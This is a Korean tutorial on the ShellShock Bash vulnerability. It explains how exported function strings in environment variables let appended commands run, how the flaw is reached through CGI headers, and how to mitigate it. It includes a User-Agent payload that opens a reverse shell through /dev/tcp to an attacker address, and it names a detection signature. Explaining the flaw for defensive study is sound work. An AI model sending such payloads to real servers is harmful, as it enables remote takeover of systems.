# GNU Bash 취약점(ShellShock)
* 2014년 9월 스테판 챠젤라스에 의해 최초 발견된 취약점으로 "CVE-2014-6271(GNU Bash 원격 명령 실행 취약점)" 취약점 범호가 부여되었으며 OpenSSL 하트블리드 취약점 이후 취약점에 이름을 짓는 유행에 따라 쉘쇼크(ShellShock)라 명명되었다. 
* 인터넷을 통해 간단한 명령만으로 시스템을 장악할 수 있는 심각성 때문에 미국국립표준기술연구소(NIST)에서는 쉘쇼크(ShellShock) 취약점 등급(CVSS)을 2014년 4월에 발표된 하트블리드 취약점(5점)보다 높은 최고 점수인 10점으로 산정하여 발표했다. 
* 최초 취약점 공개 이후 추가적인 보안 취약점이 지속적으로 발견됨.

## Bash 이해하기 Shell 변수 선언하기
### 지역변수: 선언한 쉘 내에서만 사용 가능한 변수
* `변수명=변수값` 형식으로 선언, 변수값을 참조하고자 할 경우에는 "$변수명" 형식을 사용
* `echo $$`는 현재 프로세스의 pid를 확인하는 구문
* bash 명령을 통해 자식 bash 프로세스 생성 후 부모 프로세스에 선언된 지역변수 참조 불가
* `set` 명령은 모든(지역, 환경) 변수 및 함수 목록을 반환해준다. `unset 변수명`을 통해 선언된 변수를 제거할 수 있다. 
* `env` 명령은 환경변수 및 함수 목록을 반환해준다. 따라서 지역변수로 선언한 var변수는 존재하지 않는다. 
```bash
var='local'
echo $var
> local

bash
echo $$
>1425881
ps -ef |grep bash | grep -v grep


echo $var


set |grep ^var

env |grep ^var

```

### 환경변수: 선언한 쉘뿐만이 아니라 자식 쉘에서도 사용 가능한 변수
* `export 변수명=변수값` 형식으로 선언, 일반적으로 환경변수명은 대문자 선언
* 환경변수는 자식 프로세스에서 참조 가능하므로 bash 명령을 통해 자식 bash 프로세스 생성 후 환경변수 참조
* `env` 명령을 통해 VAR 변수가 출력되면  환경변수임을 확인할 수 있음

```
export VAR='Environment'
echo $VAR

bash
echo $VAR


set | grep ^VAR
> VAR=Environment
env | grep ^VAR
> VAR=Environment
```


## Bash 이해하기 Shell 함수 선언하기
### 함수 선언
* 함수 선언 시 선언한 쉘 내에서만 호출 가능
* 함수를 환경변수에 설정하여 자식 bash 프로세스에서 사용 가능하도록 할 수 있다. 
```
export fn='() { echo "Environment function";}'

env | grep ^fn
> fn=() { echo "Environment function";}
```

* `export` 명령을 이용하여 함수를 환경변수에 문자열로 설정, 자식 bash 프로세스에서 사용가능
* `env` 명령을 통해 환경변수에 함수 문자열이 포함되어 있는 것을 확인
* 자식 프로세스는 상속받은 환경변수 중 함수 선언 문자열 "() {"이 변수 값에 설정되어 있으면 이를 함수로 선언한다. 

### Bash Shell 함수의 선언 기능 취약점
* 취약한 버전의 bash는 환경변수의 함수 선언문 뒤에 임의의 명령어를 삽입할 경우 환경변수에 설정된 함수 선언 시 함수 선언의 끝을 인지하지 못하고 삽입한 명령어까지 실행하는 취약점이 존재한다. 이것이 최초 발견된 bash 취약점(ShellShock)이다. 

```
export fn='() { echo "Environment function";};echo "command"'

env | grep ^fn
> fn=() { echo "Environment function";};echo "command"

bash
> command
```

* 위 예를 살펴보면 환경변수에 함수 선언문 문자열을 설정하면서 세미콜론(;) 기호화 함께 echo `command` 명령어를 추가하고 있다. 자식 bash 프로세스가 시작되면서 해당 환경변수의 함수 선언 시 echo 명령이 실행되는 취약점을 보여주고 있다. 

### GNU Bash 취약점(ShellShock)
* 취약점이 발생하는 부분은 bash가 제공하는 함수 선언기능이다. "() {"로 시작하는 함수 선언 문자열을 환경변수에 저장하면 동일한 이름을 가지는 함수로 선언된다. 문제는 함수 선언문 끝에 임의의 명령어를 추가로 삽입할 경우 bash가 함수문에서 처리를 멈추지 않고 추가로 삽입한 명령어를 계속 실행하기 때문에 발생한다. 

## CGI를 이용한 Bash 취약점 공격 유형

### 공격원리
* CGI(Common Gateway Interface): 웹서버에 요청된 페이지를 응용 프로그램에 전달하고 처리하기 위한 인터페이스
* 쉘쇼크(ShellShock) 취약점에 의해 영향을 받는 프로그램들 중 가장 대표적인 것이 CGI이다. CGI는 User-Agent와 같은 요청헤더정보를 쉘의 환경변수에 저장하는데, 공격자가 헤더정보에 함수와 명령어를 추가하여 전송하면 해당 명령어가 실행되는 취약점이 발생한다. 

## 리버스 쉘 연결 유형
### "/dev/tcp" 특수파일을 이용한 리버스 쉘 연결
```
USER-Agent:(){:;}; /bin/bash > /dev/tcp/10.10.10.10/8081 0<&1
```

* 공격자는 User-Agent 헤더필드에 함수문(`() { :; }`)과 명령문(`"/bin/bash > /dev/tcp/10.10.10.10/8081 0<&1"`)을 삽입하여 해당 명령문이 실행되도록 하고 있다. 


### "nc(netcat)" 프로그램을 이용한 리버스 쉘 연결


### 악성 코드 다운로드 유형

### 웹쉘 생성 유형

## 대응방안
* 취약한 버전의 Bash를 사용하고 있는 경우 최신버전으로 업데이트한다. 
* CGI 서비스의 사용 유무를 확인하여 사용하지 않는 서비스 중지시키거나 CGI를 삭제한다. 
* 네트워크 보안 장비(IPS/IDS/웹방화벽) 단에서 공격 시그니처(탐지룰)를 등록하여 차단한다. 
  * http 헤더에 "() {" 가 있으면 이를 탐지해야함. 